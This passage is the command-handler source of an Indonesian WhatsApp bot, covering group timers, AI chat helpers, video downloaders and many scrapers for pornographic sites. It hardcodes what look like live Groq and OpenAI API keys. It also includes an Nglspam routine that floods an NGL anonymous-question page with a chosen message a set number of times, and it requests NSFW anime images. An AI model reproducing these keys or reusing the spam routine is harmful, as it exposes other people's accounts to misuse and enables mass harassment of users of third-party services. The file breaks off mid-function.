require("./settings")
require('./lib/general/myfunc2')
const FormData = require('form-data');
const fs = require('fs');
const fetch = require('node-fetch');
const PDFDocument = require("pdfkit");
const { promisify } = require("util");
const streamPipeline = promisify(require("stream").pipeline);
const stream = require('stream');
const yts = require('yt-search');
const { exec } = require('child_process');
const axios = require("axios") 
const puppeteer = require('puppeteer');
const path = require('path');
const ytdl = require("ytdl-core");
const speed = require('performance-now')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const isMediaa = /image|video/.test(mime)
const { Downloader } = require("@tobyg74/tiktok-api-dl")
const { tiktokdl } = require('tiktokdl') 
const jsobfus = require('javascript-obfuscator');
const { remini, jarak, ssweb, tiktok, PlayStore, BukaLapak, pinterest, stickersearch, lirik } = require("./lib/scraper")
const { convertAngka, text2img, scsearch, capcutdl, igdown, twiterdl, snapsave, GDriveDl, snapsavev2, youtubedlv2, convertv2, jadwalSholat, findKodeDaerah, downloadCapcut, searchTemplates, detailTemplates, GoogleImage, mediafireDl, stickerSearch } = require('./lib/general/scrape')
const cheerio = require('cheerio');
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
module.exports = async (Izz, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+.=''():√%!¢£¥€π¤ΠΦ&><™Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+.=''():√%¢£¥€π¤ΠΦ&><!™Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await Izz.decodeJid(Izz.user.id)
const sender = m.key.fromMe ? (Izz.user.id.split(':')[0]+'@s.whatsapp.net' || Izz.user.id) : (m.key.participant || m.key.remoteJid)
const moment = require("moment-timezone");
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Izz.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const { y2mateplay, y2matemp3, y2matemp4 } = require('./lib/general/y2mate')
const own = JSON.parse(fs.readFileSync('./save/database/owner.json').toString())
const asis = JSON.parse(fs.readFileSync('./save/database/asisten.json').toString())
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const qmsg = (quoted.msg || quoted)
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}
const Groq = require('groq-sdk');
const client = new Groq({
    apiKey: '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'
});
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const dbFile = "./save/database/confess_db.json";

// Pastikan file database ada
if (!fs.existsSync(dbFile)) {
    fs.writeFileSync(dbFile, JSON.stringify({}), "utf-8");
}

const confessDB = JSON.parse(fs.readFileSync(dbFile, "utf-8"));

const dbaifile = "./save/database/autoai_db.json";

// Pastikan file database ada
if (!fs.existsSync(dbaifile)) {
    fs.writeFileSync(dbaifile, JSON.stringify({ status: false }), "utf-8");
}

const autoAiDB = JSON.parse(fs.readFileSync(dbaifile, "utf-8"));

const izzgcdb = "./save/database/autoclosegc_db.json";

// Pastikan file database ada
if (!fs.existsSync(izzgcdb)) {
    fs.writeFileSync(izzgcdb, JSON.stringify({}), "utf-8");
}

const autoCloseDB = JSON.parse(fs.readFileSync(izzgcdb, "utf-8"));

const Izztimer = "./save/database/timergc_db.json";

// Pastikan file database ada
if (!fs.existsSync(Izztimer)) {
    fs.writeFileSync(Izztimer, JSON.stringify({}), "utf-8");
}

const timerGCDB = JSON.parse(fs.readFileSync(Izztimer, "utf-8"));

function formatTime(timeStr) {
    let parts = timeStr.split(".");
    let hours = parseInt(parts[0]);
    let minutes = parts.length > 1 ? parseInt(parts[1]) : 0;
    return { hours, minutes };
}



async function checkAndRunTimers() {
    let now = moment().tz("Asia/Jakarta");
    let currentHours = now.hours();
    let currentMinutes = now.minutes();
    let formattedTime = now.format("HH:mm:ss"); // Format log untuk debugging

    for (let groupId in timerGCDB) {
        let { openTime, closeTime } = timerGCDB[groupId];

        if (openTime.hours === currentHours && openTime.minutes === currentMinutes) {
            await Izz.groupSettingUpdate(groupId, "not_announcement");
            await sleep(2000)
            Izz.sendMessage(groupId, { text: "✅ Grup telah dibuka sesuai jadwal!" });
        }

        if (closeTime.hours === currentHours && closeTime.minutes === currentMinutes) {
            await Izz.groupSettingUpdate(groupId, "announcement");
            await sleep(2000)
            Izz.sendMessage(groupId, { text: "🔒 Grup telah ditutup sesuai jadwal!" });
        }
    }
}

setInterval(checkAndRunTimers, 60000); // Cek setiap 1 menit

/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.blue.bgYellow.bold(namabot), 
color(`[ ADA PESAN ]`, `${randomcolor}`), color(`\n DARI =`, `${randomcolor}`), color(`${pushname}`, `${randomcolor}`), color(`\n DENGAN ISI :`, `${randomcolor}`), color(`${body}`, `green`))
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By IzzWangsap🗿`,
inviteExpiration: Date.now() + 1814400000
}
}}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
const timestamp = speed();
const latensi = speed() - timestamp;
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
     // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('*HH : mm :ss*')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
// Fungsi untuk memproses GPT

// Fungsi Sleep untuk menunggu (Rate Limit)
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Fungsi untuk memproses GPT dengan Retry jika Rate Limited
async function ChatGpt(query, sessionId) {
    let retry = 3; // Coba 3 kali jika kena rate limit
    while (retry > 0) {
        try {
            const response = await axios.post(
                "https://api.openai.com/v1/chat/completions",
                {
                    model: "gpt-3.5-turbo", // Ganti dengan model yang diinginkan
                    messages: [{ role: "user", content: query }]
                },
                {
                    headers: {
                        "Authorization": "Bearer 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",
                        "Content-Type": "application/json"
                    }
                }
            );

            return response.data.choices?.[0]?.message?.content || "Tidak ada respons dari AI.";
        } catch (error) {
            if (error.response && error.response.status === 429) {
                console.warn("⚠️ Terkena Rate Limit, menunggu 10 detik...");
                await sleep(10000); // Tunggu 10 detik sebelum mencoba lagi
                retry--;
            } else {
                console.error("❌ Error in GPT API:", error.message);
                return "⚠️ Gagal mendapatkan jawaban dari AI.";
            }
        }
    }
    return "❌ Gagal mendapatkan respons setelah beberapa percobaan.";
}
async function xhentaidl(url) {
    try {
        if (!url.includes("sfmcompile.club")) {
            return "⚠️ URL tidak valid! Harus berasal dari 'sfmcompile.club'";
        }

        console.log(`🔍 Scraping: ${url}`);

        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
        });

        const $ = cheerio.load(data);
        
        let result = {
            title: $("header > h1.entry-title").text().trim(),
            category: $("header > div.entry-before-title > span > span").text().replace("in ", "").trim(),
            share_count: $("header > div.entry-after-title > p > span.entry-shares").text().trim(),
            views_count: $("header > div.entry-after-title > p > span.entry-views").text().trim(),
            video_url: $("video > source").attr("src") || $("video").attr("src") || null
        };

        if (!result.video_url) {
            return "❌ Tidak ditemukan video di halaman ini.";
        }

        return result;
    } catch (error) {
        console.error("❌ Error scraping XHentaiDL:", error.message);
        return "⚠️ Gagal mengambil data dari XHentaiDL.";
    }
}
async function pornhubdl(videoUrl) {
    try {
        if (!videoUrl.includes("pornhub.com")) throw new Error("⚠️ URL tidak valid! Harus berasal dari Pornhub.");

        const apiUrl = "https://api.v02.savethevideo.com/tasks";
        const headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            "Referer": `https://www.savethevideo.com/de/home?url=${encodeURIComponent(videoUrl)}`
        };

        const data = { type: "info", url: videoUrl };
        const response = await axios.post(apiUrl, data, { headers });

        if (response.data && response.data.result && response.data.result.length > 0) {
            const videoData = response.data.result[0];

            const videoFormats = videoData.formats.map(f => ({
                format: f.format,
                url: f.url
            }));

            return {
                title: videoData.title,
                uploader: videoData.uploader,
                upload_date: videoData.upload_date,
                views: videoData.view_count,
                duration: videoData.duration_string,
                thumbnail: videoData.thumbnail,
                available_formats: videoFormats
            };
        }
        return { error: "⚠️ Video tidak ditemukan." };
    } catch (error) {
        return { error: error.message };
    }
}
const { pipeline } = require('stream');
const streamPipeline = promisify(pipeline);

async function downloadVideoph(url, outputPath) {
    try {
        const response = await axios({
            method: 'GET',
            url: url,
            responseType: 'stream',
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
        });

        await streamPipeline(response.data, fs.createWriteStream(outputPath));
        return outputPath;
    } catch (error) {
        console.error("❌ Error saat mengunduh video:", error);
        throw new Error("⚠️ Gagal mengunduh video.");
    }
}
async function downloadVideo(url, outputPath) {
    try {
        const response = await axios({
            method: 'GET',
            url: url,
            responseType: 'stream'
        });

        const writer = fs.createWriteStream(outputPath);
        response.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
    } catch (error) {
        console.error("❌ Error saat mengunduh video:", error);
        throw new Error("⚠️ Gagal mengunduh video.");
    }
}
async function xhentaisrc(query, page) {
    try {
        if (!page) page = Math.floor(Math.random() * 1153) + 1;

        const url = `https://sfmcompile.club/page/${page}/?s=${encodeURIComponent(query)}`;
        console.log(`🔍 Scraping: ${url}`);

        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
        });

        const $ = cheerio.load(data);
        const results = [];

        $("#primary > div > div > ul > li > article").each((index, element) => {
            results.push({
                title: $(element).find("header > h2").text().trim(),
                link: $(element).find("header > h2 > a").attr("href"),
                category: $(element).find("header > div.entry-before-title > span > span").text().replace("in ", "").trim(),
                share_count: $(element).find("header > div.entry-after-title > p > span.entry-shares").text().trim(),
                views_count: $(element).find("header > div.entry-after-title > p > span.entry-views").text().trim()
            });
        });

        return results.length > 0 ? results : `❌ Tidak ditemukan hasil untuk '${query}' di halaman ${page}.`;
    } catch (error) {
        console.error("❌ Error scraping XHentaiSrc:", error.message);
        return "⚠️ Gagal mengambil data dari XHentaiSrc.";
    }
}
async function xhentai(page) {
    return new Promise((resolve, reject) => {
    const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/' + page)
            .then((data) => {
                const $ = cheerio.load(data.data);
                const hasil = [];
                $('#primary > div > div > ul > li > article').each(function (a, b) {
                    hasil.push({
                        title: $(b).find('header > h2').text(),
                        link: $(b).find('header > h2 > a').attr('href'),
                        category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
                        share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
                        views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
                        type: $(b).find('source').attr('type') || 'image/jpeg',
                        video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
                        video_2: $(b).find('video > a').attr('href') || ''
                    });
                });
                resolve(hasil);
            })
            .catch(reject);
    });
}

async function generateAnimeImage(prompt) {
  try {
    return await new Promise(async (resolve, reject) => {
      if (!prompt) return reject("Prompt tidak boleh kosong!");

      axios.post("https://aiimagegenerator.io/api/model/predict-peach", {
        prompt,
        key: "Anime",
        width: 512,
        height: 768,
        quantity: 1,
        size: "512x768",
        nsfw: true
      }).then(res => {
        const data = res.data;
        if (data.code !== 0) return reject(data.message);
        if (!data.data?.url) return reject("Gagal mendapatkan URL gambar!");

        return resolve({
          status: true,
          image: data.data.url
        });
      }).catch(reject);
    });
  } catch (e) {
    return { status: false, message: e.message };
  }
}
/**
 * Fungsi aiyanz yang mengirimkan query ke https://yanzgpt.my.id/chat
 * dan mengembalikan hasil chat dari AI.
 *
 * @param {string} query - Pesan yang ingin dikirimkan.
 * @returns {Promise<string>} - Hasil chat yang dikembalikan.
 */
async function aiyanz(query) {
  // Membuka browser headless
  const browser = await puppeteer.launch({
  headless: true,
  args: ['--no-sandbox', '--disable-setuid-sandbox']
});
  const page = await browser.newPage();
  
  // Buka halaman chat
  await page.goto('https://yanzgpt.my.id/chat', { waitUntil: 'networkidle2' });
  
  // Tunggu sampai input chat tersedia
  // Sesuaikan selector dengan struktur aktual dari halaman (misalnya textarea atau input tertentu)
  await page.waitForSelector('textarea');
  
  // Masukkan query ke dalam input chat
  await page.type('textarea', query, { delay: 50 });
  
  // Klik tombol kirim
  // Sesuaikan selector tombol sesuai dengan halaman, misalnya: button[type="submit"]
  await page.click('button[type="submit"]');
  
  // Tunggu respons muncul
  // Sesuaikan selector respons (misalnya .chat-response) dengan struktur DOM halaman
  await page.waitForSelector('.chat-response', { timeout: 15000 });
  
  // Ambil teks respons dari elemen chat
  const result = await page.evaluate(() => {
    const responseEl = document.querySelector('.chat-response');
    return responseEl ? responseEl.innerText.trim() : "Tidak ada respons.";
  });
  
  // Tutup browser
  await browser.close();
  
  return result;
}
/*╼┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉┉╾*/
    // Fungsi Nglspam
async function Nglspam(url, query, jumlah) {
    if (isNaN(jumlah) || jumlah <= 0) {
        throw new Error("Jumlah harus angka > 0");
    }

    console.log(`Memulai spam ke NGL: ${url}\nPesan: ${query}\nJumlah: ${jumlah}\n`);

    for (let i = 0; i < jumlah; i++) {
        try {
            let formData = new URLSearchParams();
            // Field 'question' (atau sesuaikan nama field di form NGL)
            formData.append("question", query);

            let res = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: formData
            });

            if (!res.ok) {
                console.log(`❌ Gagal attempt #${i+1} | status: ${res.status}`);
            } else {
                console.log(`✅ Sukses attempt #${i+1}`);
            }
        } catch (err) {
            console.log(`❌ Error attempt #${i+1} :`, err.message);
        }
    }

    console.log("Selesai spam NGL!");
}
async function movsearch(query) {
  const url = `https://www.themoviedb.org/search/movie?query=${encodeURIComponent(query)}`;

  try {
    const { data } = await axios.get(url);
    const $ = cheerio.load(data);
    const film = [];

    $('a.result').each((index, element) => {
      const title = $(element).find('h2').text().trim();
      const name = $(element).find('span.title').text().trim();
      const href = $(element).attr('href');
      if (title && name && href) {
        film.push({
          title: title,
          name: name,
          url: `https://www.themoviedb.org${href}`
        });
      }
    });
    return film;
  } catch (error) {
    return [];
  }
}


// Fungsi untuk mencari ID berdasarkan judul
async function getIDByTitle(title) {
    try {
        let url = `https://nhentai.net/search/?q=${encodeURIComponent(title)}`;
        let { data } = await axios.get(url);
        let regex = /<a href="\/g\/(\d+)\//g;
        let match = regex.exec(data);
        return match ? match[1] : null;
    } catch (error) {
        return null;
    }
}

// Fungsi untuk mencari detail berdasarkan ID
async function getNHentaiByID(id) {
    try {
        let url = `https://cin.mom/v/${id}/`;
        let { data } = await axios.get(url);
        let json = JSON.parse(data.split('<script id="__NEXT_DATA__" type="application/json">')[1].split('</script>')[0]);
        let info = json.props.pageProps.data;

        let pages = info.images.pages.map((v, i) => {
            let ext = new URL(v.t).pathname.split('.')[1];
            return `https://i7.nhentai.net/galleries/${info.media_id}/${i + 1}.${ext}`;
        });

        return {
            id: info.id,
            title: info.title.english || "N/A",
            upload_date: new Date(info.upload_date * 1000).toLocaleDateString(),
            num_pages: pages.length,
            tags: info.tags.map(tag => tag.name),
            artist: info.tags.filter(tag => tag.type === "artist").map(tag => tag.name),
            category: info.tags.filter(tag => tag.type === "category").map(tag => tag.name),
            language: info.tags.filter(tag => tag.type === "language").map(tag => tag.name),
            thumb: `https://t.nhentai.net/galleries/${info.media_id}/thumb.jpg`,
            pages
        };
    } catch (error) {
        return { error: error.message };
    }
}

// Fungsi untuk mengonversi gambar menjadi PDF

const { getBuffer } = require('./lib/helper'); // Fungsi untuk mengunduh gambar

async function convertImagesToPDF(imageUrls) {
    return new Promise(async (resolve, reject) => {
        try {
            let doc = new PDFDocument({ autoFirstPage: false });
            let buffers = [];

            doc.on('data', buffers.push.bind(buffers));
            doc.on('end', () => resolve(Buffer.concat(buffers)));

            for (let img of imageUrls) {
                let imgBuffer = await getBuffer(img);
                doc.addPage({ size: 'A4' }).image(imgBuffer, { fit: [595, 842] });
            }

            doc.end();
        } catch (error) {
            reject(error);
        }
    });
}

async function themovD(linkhal) {
  try {
    const { data } = await axios.get(linkhal);
    const $ = cheerio.load(data);

    const poster = $('.blurred img.poster').attr('src') || '';
    const users = $('.user_score_chart').attr('data-percent') || '';
    const desk = $('.overview p').text().trim();

    const vote = [];
    $('.people.scroller li.card').each((index, element) => {
      const OrangUrl = `https://www.themoviedb.org${$(element).find('a').attr('href')}`;
      const orang2 = $(element).find('p a').text().trim();
      const char = $(element).find('.character').text().trim();
      const eps = $(element).find('.episode_count').text().trim();

      if (OrangUrl && orang2) {
        vote.push({
          orang2,
          char,
          eps,
          OrangUrl
        });
      }
    });

    const top = [];
    $('.leaderboard .edit_leader').each((index, element) => {
      const Toplink = `https://www.themoviedb.org${$(element).find('a').attr('href')}`;
      const Topnma = $(element).find('.info a').text().trim();
      const jumlh = $(element).find('.edit_count').text().split('\n')[0].trim();

      if (Toplink && Topnma) {
        top.push({
          Topnma,
          jumlh,
          Toplink
        });
      }
    });

    return {
      poster,
      users,
      desk,
      vote,
      top
    };
  } catch (error) {
    return {
      error: 'Gagal mengambil data'
    };
  }
}

function encodeUrl(url) {
    return encodeURIComponent(url);
}

async function ypsearch(query) {
    try {
        if (!query) throw new Error("⚠️ Masukkan kata kunci untuk mencari video!");

        const url = `https://www.youporn.com/search/?query=${encodeURIComponent(query)}`;
        console.log(`🔍 Scraping: ${url}`);

        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
        });

        const $ = cheerio.load(data);
        const results = [];

        $(".video-box").each((i, el) => {
            if (i >= 10) return false; // Ambil hanya 10 hasil teratas
            
            let title = $(el).find(".video-title").text().trim();
            let link = "https://www.youporn.com" + $(el).find("a").attr("href"); // Ambil href langsung
            let duration = $(el).find(".video-duration").text().trim();
            let thumbnail = $(el).find("img").attr("data-src") || $(el).find("img").attr("src");

            results.push({
                title,
                link,
                duration,
                thumbnail
            });
        });

        return results.length > 0 ? results : `❌ Tidak ditemukan hasil untuk '${query}'.`;
    } catch (error) {
        console.error("❌ Error scraping YouPorn:", error.message);
        return "⚠️ Gagal mengambil data dari YouPorn.";
    }
}


async function ypdown(videoUrl) {
    try {
        if (!videoUrl.includes("youporn.com")) throw new Error("⚠️ URL tidak valid! Harus berasal dari YouPorn.");

        const apiUrl = "https://api.v02.savethevideo.com/tasks";
        const headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            "Referer": `https://www.savethevideo.com/de/home?url=${encodeURIComponent(videoUrl)}`
        };

        const data = { type: "info", url: videoUrl };
        const response = await axios.post(apiUrl, data, { headers });

        if (response.data && response.data.result && response.data.result.length > 0) {
            const videoData = response.data.result[0];

            const videoFormats = videoData.formats.map(f => ({
                format: f.format,
                url: f.url
            }));

            return {
                title: videoData.title,
                uploader: videoData.uploader,
                upload_date: videoData.upload_date,
                views: videoData.view_count,
                duration: videoData.duration_string,
                thumbnail: videoData.thumbnail,
                available_formats: videoFormats
            };
        }
        return { error: "⚠️ Video tidak ditemukan." };
    } catch (error) {
        return { error: error.message };
    }
}
async function xvideosSearch(query) {
    try {
        const url = `https://www.xvideos.com/?k=${encodeURIComponent(query)}`;
        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
        });

        const $ = cheerio.load(data);
        const results = [];

        $('.mozaique .thumb-block').each((index, element) => {
            if (index >= 5) return; // Ambil hanya 5 hasil pertama
            let title = $(element).find('.thumb-under h3 a').text().trim();
            let link = "https://www.xvideos.com" + $(element).find('.thumb-under h3 a').attr('href');
            let duration = $(element).find('.duration').text().trim();
            let views = $(element).find('.metadata .rating-box').text().trim();
            let thumbnail = $(element).find('.thumb img').attr('data-src');

            results.push({ title, link, duration, views, thumbnail });
        });

        return results.length > 0 ? results : "❌ Tidak ditemukan hasil.";
    } catch (error) {
        console.error("❌ Error scraping Xvideos:", error.message);
        return "⚠️ Gagal mengambil data dari Xvideos.";
    }
}
async function scrapeXhamster(query) {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.goto(`https://xhamster.com/search/${encodeURIComponent(query)}`);

    // Tunggu hingga elemen video muncul
    await page.waitForSelector('.thumb-list__item', { timeout: 10000 });

    // Ambil data video
    const videos = await page.evaluate(() => {
        const items = document.querySelectorAll('.thumb-list__item');
        return Array.from(items).slice(0, 10).map(item => {
            const titleElement = item.querySelector('.video-thumb-info__name');
            const durationElement = item.querySelector('.thumb-image-container__duration');
            const viewsElement = item.querySelector('.video-thumb-info__views');
            const linkElement = item.querySelector('a.video-thumb-info__name');

            return {
                title: titleElement ? titleElement.innerText.trim() : 'N/A',
                duration: durationElement ? durationElement.innerText.trim() : 'N/A',
                views: viewsElement ? viewsElement.innerText.trim() : 'N/A',
                link: linkElement ? linkElement.href : 'N/A'
            };
        });
    });

    await browser.close();
    return videos;
}
async function xhamsterDownload(url) {
    try {
        // Mengirim permintaan awal untuk membuat tugas pengunduhan
        const createTaskResponse = await axios.post('https://api.v02.savethevideo.com/tasks', {
            url: url
        });

        const taskId = createTaskResponse.data.task.id;

        // Memeriksa status tugas hingga selesai
        let taskStatus = 'processing';
        let downloadUrl = '';
        while (taskStatus === 'processing') {
            const taskStatusResponse = await axios.get(`https://api.v02.savethevideo.com/tasks/${taskId}`);
            taskStatus = taskStatusResponse.data.task.status;

            if (taskStatus === 'finished') {
                downloadUrl = taskStatusResponse.data.task.output.url;
            } else if (taskStatus === 'error') {
                throw new Error('Terjadi kesalahan saat memproses video.');
            }

            // Menunggu beberapa detik sebelum memeriksa status lagi
            await new Promise(resolve => setTimeout(resolve, 5000));
        }

        return downloadUrl;
    } catch (error) {
        console.error(error);
        throw new Error('Gagal mengunduh video.');
    }
}
async function xnxxsearch(query) {
    try {
        if (!query) throw new Error("⚠️ Masukkan kata kunci untuk mencari video!");

        const url = `https://www.xnxx.com/search/${encodeURIComponent(query)}`;
        console.log(`🔍 Scraping: ${url}`);

        const { data } = await axios.get(url, {
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
        });

        const $ = cheerio.load(data);
        const results = [];

        $(".mozaique .thumb-block").each((index, element) => {
            if (index >= 5) return; // Ambil hanya 5 hasil teratas
            let title = $(element).find(".thumb-under a").text().trim();
            let link = "https://www.xnxx.com" + $(element).find(".thumb-under a").attr("href");
            let duration = $(element).find(".thumb .duration").text().trim();
            let views = $(element).find(".metadata > span").first().text().trim();
            let rating = $(element).find(".metadata > span").last().text().trim();
            let thumbnail = $(element).find(".thumb img").attr("data-src") || $(element).find(".thumb img").attr("src");

            results.push({
                title,
                link,
                duration,
                views,
                rating,
                thumbnail
            });
        });

        return results.length > 0 ? results : `❌ Tidak ditemukan hasil untuk '${query}'.`;
    } catch (error) {
        console.error("❌ Error scraping XNXX:", error.message);
        return "⚠️ Gagal mengambil data dari XNXX.";
    }
}
async function convertToMP4(videoUrl) {
    try {
        const apiUrl = "https://api.v02.savethevideo.com/tasks";
        const headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            "Referer": `https://www.savethevideo.com/de/home?url=${encodeURIComponent(videoUrl)}`
        };

        const data = { type: "info", url: videoUrl };
        const response = await axios.post(apiUrl, data, { headers });

        if (response.data && response.data.result && response.data.result.length > 0) {
            const videoData = response.data.result[0];
            const bestFormat = videoData.formats.find(f => f.format.includes("mp4"));

            return bestFormat ? bestFormat.url : null;
        }
        return null;
    } catch (error) {
        console.error("❌ Error converting video:", error.message);
        return null;
    }
}
async function xnxxcdn(videoUrl) {
    try {
        if (!videoUrl.includes("xnxx.com")) throw new Error("⚠️ URL tidak valid! Harus berasal dari XNXX.");

        const apiUrl = "https://api.v02.savethevideo.com/tasks";
        const headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
            "Referer": `https://www.savethevideo.com/de/home?url=${encodeURIComponent(videoUrl)}`
        };

        const data = { type: "info", url: videoUrl };
        const response = await axios.post(apiUrl, data, { headers });

        if (response.data && response.data.result && response.data.result.length > 0) {
            const videoData = response.data.result[0];

            const videoFormats = videoData.formats.map(f => ({
                format: f.format,
                url: f.url
            }));

            return {
                title: videoData.title,
                uploader: videoData.uploader,
